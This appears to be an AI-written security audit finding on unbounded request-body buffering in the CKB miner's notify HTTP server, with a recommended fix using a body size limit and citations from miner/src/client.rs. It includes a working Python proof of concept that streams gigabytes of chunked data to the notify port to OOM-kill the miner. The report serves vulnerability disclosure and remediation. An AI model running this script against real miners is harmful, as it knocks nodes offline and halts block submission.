The code is clear and I have everything needed to make a determination.

The `handle` function in `miner/src/client.rs` at line 362:

```rust
let body = BodyExt::collect(req).await?.aggregate();
```

There is no `take(limit)`, no `http_body_util::Limited`, and no frame-count guard applied before or during collection. The `hyper::body::Incoming` type carries no built-in application-level size cap. Every byte the sender streams is buffered into a contiguous `Buf` before `serde_json::from_reader` is called.

The notify listener is only active when `config.listen` is `Some(addr)` [1](#0-0) , which is a documented, supported production feature — not an unsupported local configuration. The log message at line 207–219 explicitly instructs operators to configure it. [2](#0-1) 

The listen address is operator-chosen; it is commonly `127.0.0.1:PORT`. Any unprivileged local process can open a TCP connection to a loopback port without elevated privileges. If the operator binds to `0.0.0.0`, any LAN peer qualifies.

The missing guard is concrete and locally testable. The impact (OOM-kill of the miner process, halting block submission) is within the stated scope.

---

### Title
Unbounded HTTP request body buffering in miner notify server leads to OOM — (`miner/src/client.rs`)

### Summary
The miner's notify HTTP server collects the full incoming request body into memory with no size limit, allowing any TCP client that can reach the configured listen address to exhaust process memory and crash the miner.

### Finding Description
`handle()` in `miner/src/client.rs` calls `BodyExt::collect(req).await?.aggregate()` directly on the raw `hyper::body::Incoming` without applying any size cap. [3](#0-2)  Neither `http_body_util::Limited` nor a manual byte-count check is used. The notify listener is spawned unconditionally whenever `config.listen` is `Some`. [4](#0-3) 

### Impact Explanation
An attacker sends an HTTP POST with a chunked body of arbitrary size (e.g., 1 GB or more). The Tokio task servicing that connection allocates heap memory proportional to the body size before any application logic runs. Sending enough data triggers the Linux OOM killer or a Rust allocator panic, terminating the miner process and halting block submission.

### Likelihood Explanation
The notify listen address defaults to loopback in typical deployments. Any unprivileged local user account (e.g., on a shared server or CI host) can open a TCP connection to a loopback port. No authentication, no token, and no special privilege is required. The attack is a single HTTP request.

### Recommendation
Wrap the incoming body with `http_body_util::Limited` before collecting:

```rust
use http_body_util::Limited;

const MAX_BODY: u64 = 4 * 1024 * 1024; // 4 MiB — far larger than any real block template

async fn handle(
    client: Client,
    req: Request<hyper::body::Incoming>,
) -> Result<Response<Empty<Bytes>>, Error> {
    let limited = Limited::new(req, MAX_BODY);
    let body = BodyExt::collect(limited).await?.aggregate();
    // ...
}
```

`Limited` returns `Err` (mapped to `LengthLimitError`) once the threshold is exceeded, aborting the connection without buffering the full payload.

### Proof of Concept
```python
import socket, time

HOST, PORT = "127.0.0.1", <configured_notify_port>
s = socket.create_connection((HOST, PORT))
# Send chunked HTTP/1.1 request; each chunk is 1 MiB of 'A'
header = (
    "POST / HTTP/1.1\r\n"
    f"Host: {HOST}\r\n"
    "Transfer-Encoding: chunked\r\n"
    "Content-Type: application/json\r\n\r\n"
).encode()
s.sendall(header)
chunk = b"A" * (1024 * 1024)
hex_len = f"{len(chunk):x}\r\n".encode()
for _ in range(2048):          # 2 GiB total
    s.sendall(hex_len + chunk + b"\r\n")
    time.sleep(0.001)
# Observe miner process OOM-killed
```

### Citations

**File:** miner/src/client.rs (L206-206)
```rust
        if let Some(addr) = self.config.listen {
```

**File:** miner/src/client.rs (L207-221)
```rust
            ckb_logger::info!("listen notify mode : {}", addr);
            ckb_logger::info!(
                r#"
Please note that ckb-miner runs in notify mode. \
You should configure the corresponding information in CKB block assembler, \
for example:

[block_assembler]
...
notify = ["http://{}"]

Otherwise ckb-miner will malfunction and stop submitting valid blocks after a certain period.
"#,
                addr
            );
```

**File:** miner/src/client.rs (L234-271)
```rust
    async fn listen_block_template_notify(&self, addr: SocketAddr) {
        let listener = TcpListener::bind(addr).await.unwrap();
        let server = auto::Builder::new(TokioExecutor::new());
        let graceful = GracefulShutdown::new();
        let stop_rx: CancellationToken = new_tokio_exit_rx();

        loop {
            let client = self.clone();
            let handle = service_fn(move |req| handle(client.clone(), req));
            tokio::select! {
                conn = listener.accept() => {
                    let (stream, _) = match conn {
                        Ok(conn) => conn,
                        Err(e) => {
                            info!("accept error: {}", e);
                            tokio::time::sleep(std::time::Duration::from_secs(1)).await;
                            continue;
                        }
                    };
                    let stream = hyper_util::rt::TokioIo::new(Box::pin(stream));
                    let conn = server.serve_connection_with_upgrades(stream, handle);

                    let conn = graceful.watch(conn.into_owned());
                    tokio::spawn(async move {
                        if let Err(err) = conn.await {
                            info!("connection error: {}", err);
                        }
                    });
                },
                _ = stop_rx.cancelled() => {
                    info!("Miner client received exit signal. Exit now");
                    break;
                }
            }
        }
        drop(listener);
        graceful.shutdown().await;
    }
```

**File:** miner/src/client.rs (L358-369)
```rust
async fn handle(
    client: Client,
    req: Request<hyper::body::Incoming>,
) -> Result<Response<Empty<Bytes>>, Error> {
    let body = BodyExt::collect(req).await?.aggregate();

    if let Ok(template) = serde_json::from_reader(body.reader()) {
        client.update_block_template(template);
    }

    Ok(Response::new(Empty::new()))
}
```
